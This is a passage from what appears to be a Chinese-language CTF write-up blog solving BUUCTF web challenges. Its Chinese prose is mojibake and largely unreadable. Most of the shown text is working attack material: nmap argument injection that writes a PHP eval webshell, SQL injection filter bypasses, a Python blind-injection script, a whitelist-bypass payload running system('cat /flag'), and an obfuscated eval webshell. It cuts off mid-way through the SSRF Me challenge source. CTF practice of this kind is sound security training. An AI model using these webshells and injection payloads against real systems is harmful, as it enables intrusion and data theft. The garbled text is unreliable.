</div><p>å›æ˜¾hackerï¼Œå¯èƒ½åŒ¹é…äº†åç¼€åphp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39; &lt;?= @eval($_POST[&#34;cmd&#34;]);?&gt; -oG shell.phtml &#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>å›æ˜¾hostmaybedown</p>
<p>åŠ ä¸Šip</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">127.0.0.1 |&#39; &lt;?= @eval($_POST[&#34;cmd&#34;]);?&gt; -oG shell.phtml &#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸Šä¼ åèšå‰‘è¿æ¥</p>
<p>è§£æ³•äºŒç”¨<code>-iL</code>å‚æ•°è¯»å–æ–‡ä»¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">127.0.0.1 |&#39; -iL /flag -o 1 &#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>å› ä¸ºæ³¨é‡Šé‡Œé¢æœ‰æç¤ºflagåœ¨æ ¹ç›®å½•</p>
<p>è¿™æ ·å†è®¿é—®1å°±å¾—åˆ°flag</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250216231516444.png"
	width="1521"
	height="819"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250216231516444_hu2269534670420213717.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250216231516444_hu970993745596054007.png 1024w"
	loading="lazy"
	
		alt="image-20250216231516444"
	
	
		class="gallery-image" 
		data-flex-grow="185"
		data-flex-basis="445px"
	
></p>
<h2 id="npuctf2020readlezphp">[NPUCTF2020]ReadlezPHP
</h2><p>ååºåˆ—åŒ–ï¼Œè¿‡æ»¤systemï¼Œç”¨assertæŸ¥çœ‹phpinfo</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">HelloPhp</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="nv">$a</span><span class="o">=</span><span class="s1">&#39;phpinfo()&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="nv">$b</span><span class="o">=</span><span class="s1">&#39;assert&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$b</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">HelloPhp</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æŸ¥æ‰¾flagå°±æœ‰äº†</p>
<h2 id="swpu2019web1">[SWPU2019]Web1
</h2><p>sqlæ³¨å…¥è¿‡æ»¤äº†orå’Œç©ºæ ¼å’Œæ³¨é‡Šï¼Œç”¨/**/ç»•è¿‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1&#39;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;
</span></span><span class="line"><span class="cl">1&#39;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;
</span></span><span class="line"><span class="cl">1&#39;/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&#34;web1&#34;&#39;
</span></span><span class="line"><span class="cl">1&#39;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="æ— åˆ—åæ³¨å…¥">æ— åˆ—åæ³¨å…¥
</h3><p>å¦‚æœinformation_schemaè¢«WAF,å¾—åˆ°è¡¨åä¹‹åä½¿ç”¨æ— åˆ—åæ³¨å…¥æŠ€å·§è·å–å­—æ®µå€¼.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select 1,2,3 union select * from æµ‹è¯•
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¹‹åå°±å¯ä»¥åˆ©ç”¨æ•°å­—æ¥å¯¹åº”ç›¸åº”çš„åˆ—,è¿›è¡ŒæŸ¥è¯¢</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select `2` from (select 1,2,3 union select * from æµ‹è¯•) as test
</span></span></code></pre></td></tr></table>
</div>
</div><p>1ã€åˆ—åéœ€è¦ç”¨``åŒ…è£¹èµ·æ¥</p>
<p>2ã€ä½¿ç”¨å­æŸ¥è¯¢çš„æ—¶å€™,å³ä¸€ä¸ªæŸ¥è¯¢åµŒå¥—åœ¨å¦ä¸€ä¸ªæŸ¥è¯¢ä¸­,å†…å±‚æŸ¥è¯¢çš„ç»“æœå¯ä»¥ä½œä¸ºå¤–å±‚æŸ¥è¯¢çš„æ¡ä»¶,å†…å±‚æŸ¥è¯¢åˆ°çš„ç»“æœéœ€è¦èµ·ä¸€ä¸ªåˆ«å(as)</p>
<p>å¦‚æœåå¼•å·``è¢«è¿‡æ»¤,å¯ä»¥ä½¿ç”¨ä¸ºå­—æ®µèµ·åˆ«åçš„æ–¹å¼.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select b from (select 1,2 as b,3 union select * from æµ‹è¯•) as test
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019finalsql">[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL
</h2><p>ç›²æ³¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://5045a2b7-44b5-44ee-99d1-9db358afe49c.node5.buuoj.cn:81/search.php?&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">temp</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">column</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.06</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">low</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="cl">    <span class="n">high</span> <span class="o">=</span> <span class="mi">128</span>
</span></span><span class="line"><span class="cl">    <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">low</span> <span class="o">&lt;</span> <span class="n">high</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># åº“å</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#temp[&#34;id&#34;] = &#34;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&#34; % (i, mid)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># è¡¨å</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#temp[&#34;id&#34;] = &#34;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)^1&#34; %(i,mid)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># å­—æ®µå</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#temp[&#34;id&#34;] = &#34;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;F1naI1y&#39;)),%d,1))&gt;%d)^1&#34; %(i,mid)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># å†…å®¹</span>
</span></span><span class="line"><span class="cl">        <span class="n">temp</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),</span><span class="si">%d</span><span class="s2">,1))&gt;</span><span class="si">%d</span><span class="s2">)^1&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">temp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.04</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">low</span><span class="p">,</span> <span class="n">high</span><span class="p">,</span> <span class="n">mid</span><span class="p">,</span> <span class="s2">&#34;:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Click&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">mid</span> <span class="o">==</span> <span class="mi">32</span> <span class="ow">or</span> <span class="n">mid</span> <span class="o">==</span> <span class="mi">127</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="n">column</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">column</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;All:&#34;</span><span class="p">,</span> <span class="n">column</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ciscn-2019-åˆèµ›love-math">[CISCN 2019 åˆèµ›]Love Math
</h2><p>è¿™é‡Œé»‘åå•è¿‡æ»¤äº†ä¸å°‘ä¸œè¥¿ï¼Œå¸¸è§„çš„cat/flagéƒ½ä¸èƒ½ä½¿ç”¨äº†ï¼Œè¿™é‡Œæœ‰ä¸ªçŸ¥è¯†ç‚¹æ˜¯phpä¸­å¯ä»¥æŠŠå‡½æ•°åé€šè¿‡å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ é€’ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶åé€šè¿‡æ­¤å˜é‡åŠ¨æ€è°ƒç”¨å‡½æ•°æ¯”å¦‚ä¸‹é¢çš„ä»£ç ä¼šæ‰§è¡Œ system(â€˜cat/flagâ€™);</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä½†æ˜¯è¿™é‡Œçš„_GETå’Œaï¼Œbéƒ½ä¸æ˜¯ç™½åå•é‡Œé¢çš„ï¼Œè¿™é‡Œéœ€è¦æ›¿æ¢</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?c=($_GET[pi])($_GET[abs])&amp;pi=system&amp;abs=cat /flag
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä½†æ˜¯è¿™é‡Œçš„_GETæ˜¯æ— æ³•è¿›è¡Œç›´æ¥æ›¿æ¢ï¼Œè€Œä¸”[]ä¹Ÿè¢«é»‘åå•è¿‡æ»¤äº†</p>
<p>hex2bin() å‡½æ•°æŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚</p>
<p>ä½†æ˜¯hex2bin()å‡½æ•°ä¹Ÿä¸æ˜¯ç™½åå•é‡Œé¢çš„ï¼Œè€Œä¸”è¿™é‡Œçš„5f 47 45 54ä¹Ÿä¸èƒ½ç›´æ¥å¡«å…¥,ä¼šè¢«è¿‡æ»¤</p>
<p>è¿™é‡Œçš„hex2bin()å‡½æ•°å¯ä»¥é€šè¿‡base_convert()å‡½æ•°æ¥è¿›è¡Œè½¬æ¢</p>
<p>base_convert()å‡½æ•°èƒ½å¤Ÿåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—</p>
<p>è¿™é‡Œçš„hex2binå¯ä»¥çœ‹åšæ˜¯36è¿›åˆ¶ï¼Œç”¨base_convertæ¥è½¬æ¢å°†åœ¨10è¿›åˆ¶çš„æ•°å­—è½¬æ¢ä¸º16è¿›åˆ¶å°±å¯ä»¥å‡ºç°hex2bin</p>
<p>hex2bin=base_convert(37907361743,10,36)</p>
<p>ç„¶åé‡Œé¢çš„5f 47 45 54è¦ç”¨dechex()å‡½æ•°å°†10è¿›åˆ¶æ•°è½¬æ¢ä¸º16è¿›åˆ¶çš„æ•°</p>
<p>dechex(1598506324)ï¼Œ1598506324è½¬æ¢ä¸º16è¿›åˆ¶å°±æ˜¯5f 47 45 54</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">payload</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="err">?</span><span class="n">c</span><span class="o">=$</span><span class="n">pi</span><span class="o">=</span><span class="n">base_convert</span><span class="p">(</span><span class="mi">37907361743</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">36</span><span class="p">)(</span><span class="n">dechex</span><span class="p">(</span><span class="mi">1598506324</span><span class="p">));(</span><span class="o">$$</span><span class="n">pi</span><span class="p">){</span><span class="n">pi</span><span class="p">}((</span><span class="o">$$</span><span class="n">pi</span><span class="p">){</span><span class="nb">abs</span><span class="p">})</span><span class="o">&amp;</span><span class="n">pi</span><span class="o">=</span><span class="n">system</span><span class="o">&amp;</span><span class="nb">abs</span><span class="o">=</span><span class="n">cat</span> <span class="o">/</span><span class="n">flag</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019rce-me">[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME
</h2><p>ä¸Šä¼ webshellï¼Œèšå‰‘è¿æ¥,æ­£åˆ™ç”¨å–åç»•è¿‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="s1">&#39;assert&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="s1">&#39;(eval($_POST[cmd]))&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$d</span><span class="o">=</span><span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$d</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸¤ä¸ªå‚æ•°è¦ç”¨ï¼ˆï¼‰éš”å¼€</p>
<p>ç”±äºå‘½ä»¤æ‰§è¡Œå‚æ•°è¢«è¿‡æ»¤äº†ï¼Œç”¨èšå‰‘æ’ä»¶ç»•è¿‡</p>
<p>ç›´æ¥/readflag</p>
<h2 id="de1ctf-2019ssrf-me">[De1CTF 2019]SSRF Me
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#! /usr/bin/env python</span>
</span></span><span class="line"><span class="cl"><span class="c1"># #encoding=utf-8</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">request</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl"><span class="n">reload</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">setdefaultencoding</span><span class="p">(</span><span class="s1">&#39;latin1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">secert_key</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Task</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">action</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span> <span class="n">sign</span><span class="p">,</span> <span class="n">ip</span><span class="p">):</span>		<span class="c1">#æ˜¯ä¸€ä¸ªç®€å•çš„èµ‹å€¼å‡½æ•°</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">action</span> <span class="o">=</span> <span class="n">action</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">param</span> <span class="o">=</span> <span class="n">param</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">sign</span> <span class="o">=</span> <span class="n">sign</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">sandbox</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">sandbox</span><span class="p">)):</span>		<span class="c1">#å¦‚æœæ²¡æœ‰è¯¥æ–‡ä»¶å¤¹ï¼Œåˆ™åˆ›ç«‹ä¸€ä¸ªæ–‡ä»¶å¤¹</span>
</span></span><span class="line"><span class="cl">            <span class="n">os</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">sandbox</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">Exec</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">500</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">checkSign</span><span class="p">()):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;scan&#34;</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">action</span><span class="p">:</span>
